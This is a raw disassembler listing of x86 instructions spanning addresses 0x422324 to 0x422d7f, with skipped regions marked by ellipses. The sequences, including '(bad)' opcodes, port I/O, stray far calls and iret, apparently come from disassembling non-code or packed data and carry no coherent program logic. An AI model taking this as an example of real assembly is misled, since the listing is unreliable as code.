  422324:	enter  0x3502,0xea
  422328:	in     eax,0x7b
  42232a:	shr    DWORD PTR [esi+0x16d9fa1d],1
  422330:	ja     0x422307
  422332:	loopne 0x42233e
  422334:	fcom   QWORD PTR [eax+edx*4]
  422337:	jmp    0x5566:0x2f49241e
  42233e:	stc    
  42233f:	mov    ds:0x3007ee9d,al
  422344:	fidiv  WORD PTR [eax-0x40]
  422347:	aam    0xca
  422349:	bound  edi,QWORD PTR [ecx+0x64]
  42234c:	or     DWORD PTR gs:[ecx+0x3545ef28],ebp
  422353:	cld    
  422354:	xor    ebp,DWORD PTR [edx]
  422356:	loop   0x4222d9
  422358:	mov    eax,0xf17fe2b5
  42235d:	push   edi
  42235e:	pop    ebp
  42235f:	loopne 0x422316
  422361:	adc    DWORD PTR ds:0x98e88e88,0x8be8036d
  42236b:	sbb    cl,al
  42236d:	bound  eax,QWORD PTR [ebx+0x480354ae]
  422373:	sub    BYTE PTR [edi-0x63],0xba
  422377:	mov    eax,0xff8286dc
  42237c:	and    al,bh
  42237e:	mov    esp,eax
  422380:	adc    DWORD PTR [edi+0xd],ebx
  422383:	push   esp
  422384:	or     BYTE PTR [edx+0x73bf1c22],al
  42238a:	out    dx,eax
  42238b:	imul   ecx,esp,0xffffffe2
  42238e:	sub    al,BYTE PTR [eax]
  422390:	adc    esp,ecx
  422392:	out    0x84,eax
  422394:	inc    edi
  422395:	mov    esi,ebx
  422397:	fnstenv [edx]
  422399:	add    DWORD PTR [ebx-0x74],ebx
  42239c:	mov    ebx,0xa3ffa5fe
  4223a1:	pop    ecx
  4223a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223a3:	cmp    esi,edx
  4223a5:	and    esi,DWORD PTR [ebx]
  4223a7:	cmp    eax,0xc1516e4b
  4223ac:	mov    esi,0xf302d102
  4223b1:	cmp    esp,ebx
  4223b3:	sbb    ch,BYTE PTR [eax]
  4223b5:	mov    BYTE PTR [esi-0x68],dl
  4223b8:	dec    edi
  4223b9:	iret   
  4223ba:	cli    
  4223bb:	cdq    
  4223bc:	inc    esp
  4223bd:	dec    edx
  4223be:	loopne 0x42243a
  4223c0:	addr16 ret 
  4223c2:	(bad)  
  4223c3:	xchg   ecx,eax
  4223c4:	dec    eax
  4223c5:	in     eax,0xfb
  4223c7:	out    dx,al
  4223c8:	cmp    eax,0x99b99dda
  4223cd:	fnstcw WORD PTR [ebp-0x60f96d08]
  4223d3:	lahf   
  4223d4:	xor    eax,0xee633f79
  4223d9:	popf   
  4223da:	cld    
  4223db:	xchg   esi,eax
  4223dc:	fcom   QWORD PTR [eax-0x6dd2ecd0]
  4223e2:	jle    0x4223f9
  4223e4:	ja     0x4223a7
  4223e6:	int    0xd1
  4223e8:	pop    sp
  4223ea:	mov    ds:0xdf412925,eax
  4223ef:	mov    WORD PTR [edi+0x4f],cs
  4223f2:	lds    eax,FWORD PTR [edx]
  4223f4:	mov    ebx,eax
  4223f6:	jecxz  0x42244e
  4223f8:	hlt    
  4223f9:	stc    
  4223fa:	sub    edi,DWORD PTR [edi]
  4223fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223fd:	cmp    ebp,DWORD PTR [ecx+0x55f470a4]
  422403:	lea    ebx,[eax-0x14e53c10]
  422409:	stos   BYTE PTR es:[edi],al
  42240a:	repnz xchg esp,eax
  42240c:	addr16 fcmovnbe st,st(6)
  42240f:	rol    BYTE PTR [eax+0x0],1
	...
  422471:	add    BYTE PTR [eax],al
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
  42247f:	cdq    
  422480:	adc    eax,0xd93922bb
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    eax,0x1e000001
  42248d:	add    al,0xd3
  42248f:	jb     0x422464
  422491:	jns    0x42241e
  422493:	mov    eax,ds:0xc81f50de
  422498:	jge    0x4224be
  42249a:	clc    
  42249b:	mov    esi,0x875927fb
  4224a0:	dec    eax
  4224a1:	add    DWORD PTR [ecx+esi*2],ebp
  4224a4:	inc    edi
  4224a5:	iret   
  4224a6:	mov    ebp,0x6664f6b2
  4224ab:	and    BYTE PTR [eax-0x7fc8f3d9],dl
  4224b1:	add    dl,al
  4224b3:	and    bl,BYTE PTR [edi-0x69]
  4224b6:	outs   dx,DWORD PTR ds:[esi]
  4224b7:	jae    0x422495
  4224b9:	data16 daa 
  4224bb:	data16 fdivr DWORD PTR [ebp+0x7d]
  4224bf:	das    
  4224c0:	int    0x87
  4224c2:	jbe    0x422539
  4224c4:	mov    bl,0xcf
  4224c6:	clc    
  4224c7:	add    BYTE PTR [ebx-0x2dcea647],0xa7
  4224ce:	popf   
  4224cf:	add    DWORD PTR [edx],ebp
  4224d1:	dec    ebx
  4224d2:	or     bl,bl
  4224d4:	js     0x4224bb
  4224d6:	test   al,0x42
  4224d8:	aaa    
  4224d9:	push   esp
  4224da:	inc    ecx
  4224db:	xchg   ecx,eax
  4224dc:	mov    eax,DWORD PTR [edx-0x36]
  4224df:	adc    BYTE PTR [ebp-0x7a],cl
  4224e2:	(bad)  
  4224e3:	popf   
  4224e4:	xor    eax,0x94f4819f
  4224e9:	jmp    ebp
  4224eb:	push   0xffffffb1
  4224ed:	call   0x9768b5f3
  4224f2:	cmp    ebx,esi
  4224f4:	addr16 pop esi
  4224f6:	sbb    DWORD PTR [ecx],edx
  4224f8:	sbb    al,0x1d
  4224fa:	xchg   ebp,eax
  4224fb:	dec    ecx
  4224fc:	mov    ebp,0xcefd1f6f
  422501:	push   es
  422502:	inc    esi
  422503:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422504:	sbb    al,0x31
  422506:	and    bl,BYTE PTR ds:0x5a298935
  42250c:	mov    BYTE PTR [eax],bl
  42250e:	xchg   BYTE PTR [edx-0x3ff9de9e],bh
  422514:	sbb    eax,0x8ac0a5a
  422519:	popa   
  42251a:	inc    eax
  42251b:	or     bh,BYTE PTR [ecx-0x13]
  42251e:	adc    BYTE PTR [ebx-0x1854a441],bl
  422524:	bound  ebp,QWORD PTR [esi+0x57]
  422527:	jl     0x422531
  422529:	or     DWORD PTR [edi+eax*4],esp
  42252c:	sbb    al,0xd6
  42252e:	lods   al,BYTE PTR ds:[esi]
  42252f:	inc    esp
  422530:	jns    0x422575
  422532:	jge    0x422544
  422534:	arpl   WORD PTR [ebp-0x3d],dx
  422537:	pop    edi
  422538:	or     ah,BYTE PTR [ecx-0x7d8a0051]
  42253e:	add    eax,0xeaf1fd78
  422543:	scas   al,BYTE PTR es:[edi]
  422544:	sbb    DWORD PTR [eax],0x2607628a
  42254a:	jle    0x422564
  42254c:	add    esp,DWORD PTR [ebp+0x4ff4fe86]
  422552:	arpl   WORD PTR [eax+0x77],cx
  422555:	adc    al,0xe
  422557:	push   ebp
  422558:	outs   dx,BYTE PTR ds:[esi]
  422559:	js     0x42254b
  42255b:	adc    BYTE PTR [esi+0xb],cl
  42255e:	dec    ebx
  42255f:	fstp   DWORD PTR [ecx]
  422561:	test   DWORD PTR [edx],edx
  422563:	inc    ebx
  422564:	cmc    
  422565:	(bad)  
  422566:	in     eax,0xf7
  422568:	and    BYTE PTR [ebp+0x0],ch
  42256b:	les    ebp,FWORD PTR [edx]
  42256d:	mov    dl,0x82
  42256f:	rcl    BYTE PTR [edi+0x1],0x77
  422573:	repnz iret 
  422575:	fucomi st,st(6)
  422577:	test   DWORD PTR [eax+eax*8-0x505633ed],esp
  42257e:	fdivr  DWORD PTR [edx-0x4f]
  422581:	iret   
  422582:	stc    
  422583:	imul   ebp,DWORD PTR [edx-0x4407f8ac],0xdd22c0a5
  42258d:	cwde   
  42258e:	xor    DWORD PTR [edi+0xa0],ebx
	...
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx-0x55b55d08]
  422602:	int    0x62
  422604:	fisubr WORD PTR [esi+0x1]
  422607:	add    BYTE PTR ds:0x6a000001,al
  42260d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42260e:	in     al,0xaf
  422610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422611:	xor    al,0x2d
  422613:	fwait
  422614:	arpl   WORD PTR [eax+edx*8-0x3ae296f7],bx
  42261b:	int3   
  42261c:	xor    eax,0x2e165606
  422621:	pusha  
  422622:	mov    cs,WORD PTR fs:[ebx+ebx*4+0x16]
  422627:	dec    edx
  422628:	pop    eax
  422629:	test   BYTE PTR [ecx+0x63],ch
  42262c:	fsub   QWORD PTR [ecx-0x1f]
  42262f:	cmp    BYTE PTR [eax],bl
  422631:	add    al,BYTE PTR [ebx+ebp*8+0x20]
  422635:	les    eax,FWORD PTR ds:0xa1320abd
  42263b:	sbb    bl,0xae
  42263e:	or     eax,0x39e4ba52
  422643:	in     al,0x4c
  422645:	out    0x60,eax
  422647:	jmp    0x42263e
  422649:	div    BYTE PTR [ebx]
  42264b:	add    BYTE PTR [edi+0x4eed9f4e],bh
  422651:	mul    DWORD PTR [ebp+0x68]
  422654:	jp     0x4225f4
  422656:	cmp    ebp,DWORD PTR [esp+edx*1]
  422659:	push   edx
  42265a:	add    dl,BYTE PTR [ebx]
  42265c:	inc    edi
  42265d:	pop    ds
  42265e:	out    0xf0,eax
  422660:	mov    es,WORD PTR gs:[ecx-0x76f97c0d]
  422667:	out    0x43,al
  422669:	sbb    dh,BYTE PTR [edx+eiz*4]
  42266c:	and    ecx,DWORD PTR [ebx]
  42266e:	(bad)  
  42266f:	into   
  422670:	jl     0x422667
  422672:	mov    bh,0x7a
  422674:	mov    ah,0x80
  422676:	test   ch,0xc2
  422679:	add    ah,BYTE PTR [esi-0x6625e92f]
  42267f:	pop    es
  422680:	mov    ch,0x8e
  422682:	popf   
  422683:	lahf   
  422684:	dec    edx
  422685:	sbb    BYTE PTR [ebx],al
  422687:	lods   al,BYTE PTR ds:[esi]
  422688:	xchg   ebp,eax
  422689:	mov    ds:0x862bd7fe,al
  42268e:	imul   al
  422690:	adc    BYTE PTR [esi],cl
  422692:	daa    
  422693:	sub    DWORD PTR [ecx+0x67],edx
  422696:	sub    al,BYTE PTR [esi+0x1c404080]
  42269c:	into   
  42269d:	cmp    eax,ecx
  42269f:	daa    
  4226a0:	rcr    DWORD PTR [esi-0xd6f1c9a],1
  4226a6:	push   ebx
  4226a7:	aam    0x40
  4226a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226aa:	ror    DWORD PTR [edi],cl
  4226ac:	pop    ecx
  4226ad:	loope  0x4226f5
  4226af:	aas    
  4226b0:	jge    0x422711
  4226b2:	adc    BYTE PTR [ecx-0x2a],dl
  4226b5:	xor    al,0xcc
  4226b7:	pop    ecx
  4226b8:	add    eax,0x76ce4644
  4226bd:	and    dl,al
  4226bf:	xlat   BYTE PTR ds:[ebx]
  4226c0:	xchg   edi,eax
  4226c1:	xchg   edi,eax
  4226c2:	in     eax,dx
  4226c3:	aaa    
  4226c4:	dec    esi
  4226c5:	xchg   edi,eax
  4226c6:	push   es
  4226c7:	call   DWORD PTR [edx-0x6f]
  4226ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226cb:	pop    ss
  4226cc:	xchg   ebp,eax
  4226cd:	xor    al,0x31
  4226cf:	aad    0x9a
  4226d1:	(bad)  
  4226d2:	pop    ebx
  4226d3:	dec    ebx
  4226d4:	jae    0x422711
  4226d6:	scas   eax,DWORD PTR es:[edi]
  4226d7:	mov    al,ds:0xa4c11ba0
  4226dc:	out    dx,eax
  4226dd:	std    
  4226de:	dec    esp
  4226df:	jb     0x4226e4
  4226e1:	fucom  st(1)
  4226e3:	test   DWORD PTR [ecx+0x32049618],ecx
  4226e9:	xchg   ebx,eax
  4226ea:	fwait
  4226eb:	push   0x7890cdb7
  4226f0:	test   DWORD PTR [edi+esi*1-0x541184e1],0x8a79729a
  4226fb:	inc    ebp
  4226fc:	inc    edx
  4226fd:	jne    0x422770
  4226ff:	(bad)  
  422701:	jae    0x42268a
  422703:	mov    ds:0xc7e72b20,eax
  422708:	push   ds
  422709:	or     al,0xb0
  42270b:	jp     0x422780
  42270d:	in     eax,0xe
  42270f:	xlat   BYTE PTR ds:[ebx]
  422710:	sbb    al,0x0
	...
  422772:	add    BYTE PTR [eax],al
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x557f01c8
  422781:	int3   
  422782:	xor    edi,DWORD PTR [ebx+eiz*8+0x6f]
  422786:	add    DWORD PTR [eax],eax
  422788:	add    eax,0x9d000001
  42278d:	sahf   
  42278e:	push   ss
  42278f:	mov    dh,BYTE PTR [ebx]
  422791:	gs int3 
  422793:	aad    0x11
  422795:	jmp    0x4227af
  422797:	sbb    DWORD PTR [ecx-0x3b],0xffffffdc
  42279b:	test   al,0xfb
  42279d:	xchg   ecx,eax
  42279e:	inc    edi
  42279f:	ret    
  4227a0:	cmp    ebp,DWORD PTR [edx]
  4227a2:	std    
  4227a3:	cmp    al,0x7c
  4227a5:	jmp    0xeb9cb113
  4227aa:	cmp    DWORD PTR [esp+edx*2],esi
  4227ad:	popa   
  4227ae:	jo     0x422780
  4227b0:	test   al,0x2f
  4227b2:	mov    bh,0x45
  4227b4:	jl     0x42278d
  4227b6:	xchg   esi,eax
  4227b7:	mov    eax,0xe278425e
  4227bc:	cmp    BYTE PTR [edi],ch
  4227be:	adc    esp,DWORD PTR [ecx-0x135ebcc8]
  4227c4:	in     al,0x9c
  4227c6:	sar    DWORD PTR [esi+0x3d9c9b09],0xd0
  4227cd:	ds nop
  4227cf:	ins    DWORD PTR es:[edi],dx
  4227d0:	call   0x92bc:0x73e496d2
  4227d7:	mul    DWORD PTR [esi]
  4227d9:	mov    WORD PTR [edi+0x52],fs
  4227dc:	mov    ebx,0xe6fac7f3
  4227e1:	ja     0x4227ed
  4227e3:	push   0x54d5fbdc
  4227e8:	test   al,0x90
  4227ea:	xchg   edi,eax
  4227eb:	test   eax,0xa675f3d5
  4227f0:	outs   dx,BYTE PTR ds:[esi]
  4227f1:	fdiv   DWORD PTR [esi]
  4227f3:	retf   
  4227f4:	push   cs
  4227f5:	stos   BYTE PTR es:[edi],al
  4227f6:	clc    
  4227f7:	push   ecx
  4227f8:	mov    dh,0x47
  4227fa:	(bad)  
  4227fb:	jecxz  0x422874
  4227fd:	sub    al,0x74
  4227ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422800:	mov    edx,0xec4b34e2
  422805:	popf   
  422806:	test   DWORD PTR [ecx+eax*8-0x6a88ef9a],ebx
  42280d:	xchg   ecx,eax
  42280e:	dec    edi
  42280f:	or     esp,DWORD PTR fs:[edx-0x2bfbf7ff]
  422816:	int    0xad
  422818:	dec    eax
  422819:	push   ebp
  42281a:	inc    esp
  42281b:	inc    eax
  42281c:	cmp    al,dl
  42281e:	icebp  
  42281f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422820:	cmp    ah,BYTE PTR cs:[esi-0x72]
  422824:	(bad)  
  422825:	ja     0x4227cb
  422827:	and    eax,0xdb20a343
  42282c:	inc    ecx
  42282d:	les    edx,FWORD PTR [eax]
  42282f:	push   ds
  422830:	mov    edx,0x108fb61f
  422835:	push   eax
  422836:	ftst   
  422838:	cs ret 0x96ae
  42283c:	lahf   
  42283d:	mov    ?,WORD PTR [edi+ebx*8+0x4e]
  422841:	inc    ecx
  422842:	cmp    esi,esp
  422844:	inc    edi
  422845:	mov    edi,0xc51cb4a1
  42284a:	retf   
  42284b:	push   0x4d5f7219
  422850:	fwait
  422851:	pop    ebx
  422852:	mov    ds,WORD PTR [ebp-0x69]
  422855:	inc    ecx
  422856:	repz pop edi
  422858:	mov    al,ds:0x4db7cdea
  42285d:	add    eax,0x268692c9
  422862:	jmp    0x5ba17559
  422867:	jo     0x4228a7
  422869:	int    0x2f
  42286b:	jmp    0x422896
  42286d:	sbb    al,0xf6
  42286f:	(bad)  
  422871:	xchg   edx,eax
  422872:	out    0x23,al
  422874:	mov    al,ds:0xd933663f
  422879:	in     al,0xe5
  42287b:	mov    eax,eax
  42287d:	cmp    al,0x8f
  42287f:	addr16 iret 
  422881:	dec    edx
  422882:	xchg   edi,eax
  422883:	(bad)  
  422884:	mov    esi,0x9b82c1da
  422889:	nop
  42288a:	popf   
  42288b:	or     esi,DWORD PTR [edi-0xe6c4f02]
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x4228a6
  422901:	retf   0x7cf
  422904:	call   0x5422a79
  422909:	add    DWORD PTR [eax],eax
  42290b:	add    ah,al
  42290d:	jp     0x422978
  42290f:	repnz fisub WORD PTR [edi]
  422912:	push   ebx
  422913:	in     al,0xf3
  422915:	rcr    ebx,1
  422917:	xor    eax,0xecc0d1aa
  42291c:	pusha  
  42291d:	pop    esi
  42291e:	adc    al,0x11
  422920:	fdivr  DWORD PTR [esi+edi*8]
  422923:	ror    ah,1
  422925:	push   esi
  422926:	mov    BYTE PTR [ecx-0x43],ah
  422929:	mov    al,0xe7
  42292b:	mov    cl,0xca
  42292d:	mov    ds:0x3b309946,al
  422932:	jp     0x422926
  422934:	add    eax,0xbb3483fe
  422939:	mov    bh,0x63
  42293b:	and    ch,BYTE PTR [eax-0x6]
  42293e:	lods   al,BYTE PTR ds:[esi]
  42293f:	jae    0x4228f5
  422941:	int3   
  422942:	xor    al,0x13
  422944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422945:	sbb    ebp,eax
  422947:	retf   
  422948:	dec    edx
  422949:	call   0xa2a29cc1
  42294e:	mov    cl,0xca
  422950:	mov    ah,0x99
  422952:	sbb    al,0xf7
  422954:	pop    edx
  422955:	ret    
  422956:	jge    0x42290a
  422958:	adc    BYTE PTR [ebp-0x183b0c63],al
  42295e:	push   edi
  42295f:	push   es
  422960:	int3   
  422961:	lods   al,BYTE PTR ds:[esi]
  422962:	cmp    al,0xdd
  422964:	ficomp WORD PTR [edx+ebx*2-0x4]
  422968:	cmp    eax,0xfd070b77
  42296d:	xchg   ebp,eax
  42296e:	test   ebp,edx
  422970:	add    dl,ch
  422972:	(bad)
  422977:	add    cl,BYTE PTR [esi+eiz*4+0x79]
  42297b:	fisub  WORD PTR [esi]
  42297d:	retf   0x3cfc
  422980:	inc    eax
  422981:	inc    edi
  422982:	jno    0x42294c
  422984:	cmp    bh,BYTE PTR [edi-0x44768451]
  42298a:	and    ecx,esi
  42298c:	adc    eax,0xd0276305
  422991:	fs inc eax
  422993:	mov    dh,0x22
  422995:	imul   DWORD PTR [ebx]
  422997:	cmp    al,0xa
  42299a:	xchg   esp,eax
  42299b:	loope  0x422931
  42299d:	stos   DWORD PTR es:[edi],eax
  42299e:	mov    dh,0x5d
  4229a0:	retf   
  4229a1:	daa    
  4229a2:	dec    ebx
  4229a3:	xchg   ebp,eax
  4229a4:	sub    DWORD PTR [eax+0x59],ebp
  4229a7:	jae    0x4229a7
  4229a9:	xchg   ebx,eax
  4229aa:	in     al,dx
  4229ab:	cmc    
  4229ac:	lods   eax,DWORD PTR ds:[esi]
  4229ad:	clc    
  4229ae:	sub    DWORD PTR [ecx-0x179f6483],ecx
  4229b4:	mov    edi,0x7ac65a77
  4229b9:	ret    
  4229ba:	cld    
  4229bb:	mov    edi,0xd2562a9a
  4229c0:	fs pushf 
  4229c2:	in     al,0xa6
  4229c4:	iret   
  4229c5:	mov    dh,0xe3
  4229c7:	and    bh,0x56
  4229ca:	out    0xba,al
  4229cc:	xchg   ecx,eax
  4229cd:	cwde   
  4229ce:	cmp    BYTE PTR [ebp+0x7f52bccd],ch
  4229d4:	repnz les ebx,FWORD PTR [ebp+0x3e50a2a4]
  4229db:	inc    edx
  4229dc:	cwde   
  4229dd:	std    
  4229de:	xor    edx,DWORD PTR [edx+0x74d44f91]
  4229e4:	mov    esi,0x5f028e85
  4229e9:	mov    ah,0x72
  4229eb:	loopne 0x4229ff
  4229ed:	xchg   BYTE PTR [eax],cl
  4229ef:	inc    edx
  4229f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229f1:	ja     0x4229d3
  4229f3:	dec    ebp
  4229f4:	rcr    bl,0xf7
  4229f7:	lods   al,BYTE PTR ds:[esi]
  4229f8:	lods   al,BYTE PTR ds:[esi]
  4229f9:	loope  0x422a1d
  4229fb:	jp     0x4229e4
  4229fd:	mov    ebp,0xe8b9722b
  422a02:	js     0x42298a
  422a04:	jecxz  0x4229a1
  422a06:	jns    0x422997
  422a08:	dec    edx
  422a09:	xchg   esp,eax
  422a0a:	jno    0x4229b7
  422a0c:	mov    dl,0x8f
  422a0e:	ret    
  422a0f:	leave  
  422a10:	adc    al,0x0
	...
  422a72:	add    BYTE PTR [eax],al
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	jp     0x422acc
  422a82:	addr16 sbb ebp,ebp
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR ds:0x57000001,al
  422a8d:	int    0x46
  422a8f:	jne    0x422aa8
  422a91:	push   ebp
  422a92:	out    dx,al
  422a93:	shl    DWORD PTR [ebx-0x3b0d2544],cl
  422a99:	fistp  QWORD PTR [edx]
  422a9b:	jb     0x422a71
  422a9d:	(bad)  
  422a9e:	pop    esp
  422a9f:	or     edx,DWORD PTR [eax]
  422aa1:	mov    WORD PTR [edi-0x43cf2a08],cs
  422aa7:	inc    ecx
  422aa8:	cld    
  422aa9:	popf   
  422aaa:	out    dx,al
  422aab:	or     eax,0xc67df2c3
  422ab0:	jmp    0x422ad7
  422ab2:	aas    
  422ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ab4:	and    edi,esi
  422ab6:	or     esp,DWORD PTR [esi+0x2]
  422ab9:	add    bl,cl
  422abb:	xchg   edi,eax
  422abc:	test   DWORD PTR [esi+0x4cc63eda],esi
  422ac2:	ret    
  422ac3:	sbb    eax,0x175d914c
  422ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ac9:	mov    eax,ds:0xed05b318
  422ace:	or     bh,cl
  422ad0:	inc    edx
  422ad1:	xlat   BYTE PTR ds:[ebx]
  422ad2:	push   es
  422ad3:	(bad)  
  422ad4:	xor    al,0xc9
  422ad6:	adc    al,0x78
  422ad8:	xor    BYTE PTR [ecx+0x22],ah
  422adb:	and    DWORD PTR [ebx-0x66fc1a1c],esi
  422ae1:	mov    ebp,0xbe8b14
  422ae6:	stos   DWORD PTR es:[edi],eax
  422ae7:	jae    0x422a73
  422ae9:	js     0x422b29
  422aeb:	xchg   ah,dl
  422aed:	dec    edi
  422aee:	rcl    BYTE PTR [ebx],cl
  422af0:	call   0x6014:0x8253c1d
  422af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422af8:	js     0x422b1d
  422afa:	dec    edi
  422afb:	mov    al,ds:0xa555fab8
  422b00:	jge    0x422afd
  422b02:	in     al,0x5d
  422b04:	adc    eax,0xddccf4b4
  422b09:	outs   dx,BYTE PTR ds:[esi]
  422b0a:	jg     0x422af0
  422b0c:	aaa    
  422b0d:	or     BYTE PTR [ecx-0x42971757],0x35
  422b14:	mov    WORD PTR [ebx-0x33],?
  422b17:	cs pop ds
  422b19:	ret    
  422b1a:	and    al,BYTE PTR [edi+0x3a]
  422b1d:	pop    eax
  422b1e:	mov    ecx,0x82712c96
  422b23:	or     BYTE PTR [ebp-0x2b],dh
  422b26:	mov    edx,0xbcdb9011
  422b2b:	sub    DWORD PTR [ebx+0x22d0a241],ebx
  422b31:	rol    dh,0x79
  422b34:	mov    edi,0xcd45387c
  422b39:	push   ebx
  422b3a:	popa   
  422b3b:	inc    edx
  422b3c:	test   eax,0xc157b61b
  422b41:	les    eax,FWORD PTR [eax-0x40]
  422b44:	push   0xffffffcf
  422b46:	lods   al,BYTE PTR gs:[esi]
  422b48:	push   0x57
  422b4a:	inc    edi
  422b4b:	mov    ch,0x9
  422b4d:	fild   DWORD PTR [ebx+eax*1+0x58]
  422b51:	jl     0x422b48
  422b53:	enter  0xa5e6,0x2c
  422b57:	pop    ss
  422b58:	test   DWORD PTR [ebp-0x6e33757e],ebp
  422b5e:	pushf  
  422b5f:	out    0xdd,eax
  422b61:	inc    ebx
  422b62:	and    esi,DWORD PTR [ebp+0x23dd3ab9]
  422b68:	cld    
  422b69:	or     ebx,edi
  422b6b:	leave  
  422b6c:	mov    al,ds:0xb4ea4bd8
  422b71:	scas   al,BYTE PTR es:[edi]
  422b72:	or     dh,ah
  422b74:	pusha  
  422b75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b76:	add    esp,edi
  422b78:	out    0x1,eax
  422b7a:	jno    0x422b3f
  422b7c:	push   ds
  422b7d:	popf   
  422b7e:	mov    esi,0x5f382104
  422b83:	adc    BYTE PTR [esi+0x5f4bf545],al
  422b89:	mov    dh,0xdc
  422b8b:	pop    edx
  422b8c:	or     DWORD PTR [ebp+0x4fb538],ecx
	...
  422bf2:	add    BYTE PTR [eax],al
  422bf4:	inc    esp
  422bf5:	aaa    
  422bf6:	dec    edx
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x725fb264]
  422c02:	loope  0x422bbf
  422c04:	bnd jb 0x422c08
  422c07:	add    BYTE PTR ds:0xcd000001,al
  422c0d:	or     al,0xb1
  422c0f:	mov    DWORD PTR ds:0x8c07527e,ebp
  422c15:	retf   0xede7
  422c18:	dec    BYTE PTR [edi]
  422c1a:	js     0x422bfd
  422c1c:	sbb    al,0xe0
  422c1e:	mov    ah,0x12
  422c20:	out    dx,eax
  422c21:	mov    ds:0x59f1ce1c,eax
  422c26:	enter  0xf94f,0xf4
  422c2a:	pop    eax
  422c2b:	adc    ecx,DWORD PTR [edx-0xa]
  422c2e:	adc    eax,ebx
  422c30:	push   0xffffffb9
  422c32:	xchg   ebp,eax
  422c33:	mov    cl,0xd
  422c35:	pop    edi
  422c36:	jo     0x422bd4
  422c38:	fnstcw WORD PTR [edx]
  422c3a:	mov    esi,0x10fb79e7
  422c3f:	cli    
  422c40:	inc    ebx
  422c41:	xlat   BYTE PTR ds:[ebx]
  422c42:	retf   
  422c43:	sbb    al,0x12
  422c45:	jne    0x422bf8
  422c47:	or     ecx,DWORD PTR [edx+ebp*2-0x173e8d5d]
  422c4e:	adc    dl,BYTE PTR [eax]
  422c50:	ins    DWORD PTR es:[edi],dx
  422c51:	sub    dh,dh
  422c53:	add    ah,BYTE PTR [ecx+0x1a]
  422c56:	cmp    eax,0xbe6d3292
  422c5b:	xchg   ebp,eax
  422c5c:	mov    dh,0x44
  422c5e:	push   eax
  422c5f:	mov    cl,0x1
  422c61:	jno    0x422c72
  422c63:	cwde   
  422c64:	or     BYTE PTR ds:0xc8953e77,0xc4
  422c6b:	mov    bl,0xfa
  422c6d:	std    
  422c6e:	nop
  422c6f:	pop    esp
  422c70:	jne    0x422cd5
  422c72:	loopne 0x422ca1
  422c74:	pop    es
  422c75:	dec    BYTE PTR [eax+0x33]
  422c78:	out    dx,al
  422c79:	int    0x9d
  422c7b:	mov    bh,0x53
  422c7d:	shr    BYTE PTR [ebx+0x6b],cl
  422c80:	pop    ebp
  422c81:	jmp    0x83720858
  422c86:	and    edi,0xffffffbd
  422c89:	test   DWORD PTR [esi-0x55d64b97],0x6c02a364
  422c93:	jg     0x422cff
  422c95:	mov    ch,0x5c
  422c97:	das    
  422c98:	call   0x9dfb:0xaabfeb8f
  422c9f:	add    DWORD PTR [ecx],0xe2a116a4
  422ca5:	push   ebp
  422ca6:	inc    edi
  422ca7:	cmp    edx,DWORD PTR [ebp+0x5e40bfb9]
  422cad:	ret    
  422cae:	cwde   
  422caf:	test   ebp,0x665ade0a
  422cb5:	jb     0x422ccf
  422cb7:	jecxz  0x422c3c
  422cb9:	mov    al,ds:0x770aa3ee
  422cbe:	pushf  
  422cbf:	cmp    eax,0xdc8986c1
  422cc4:	push   eax
  422cc5:	stos   DWORD PTR es:[edi],eax
  422cc6:	jb     0x422d2c
  422cc8:	nop
  422cc9:	mov    esi,edx
  422ccb:	rol    BYTE PTR [eax],0x90
  422cce:	mov    dh,0x53
  422cd0:	fwait
  422cd1:	sbb    al,0x6e
  422cd3:	mov    esi,0x76059752
  422cd8:	fnsave ds:0xd82d5754
  422cde:	mov    esi,0x7a7339d7
  422ce3:	and    BYTE PTR [ebx-0x7ba1d02c],ch
  422ce9:	xor    al,0x66
  422ceb:	es add al,0xd2
  422cee:	mov    edi,0xf9e64618
  422cf3:	pop    ebp
  422cf4:	(bad)  
  422cf6:	or     edi,DWORD PTR [edi+ecx*8+0x6]
  422cfa:	add    eax,0x3f2b23f6
  422cff:	mov    BYTE PTR [esi+0x7b08fa14],bl
  422d05:	dec    edx
  422d06:	mov    eax,ds:0xa291a668
  422d0c:	pop    edx
  422d0d:	leave  
  422d0e:	retf   
  422d0f:	push   esp
  422d10:	outs   dx,BYTE PTR ds:[esi]
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    ebx,DWORD PTR [ebx]
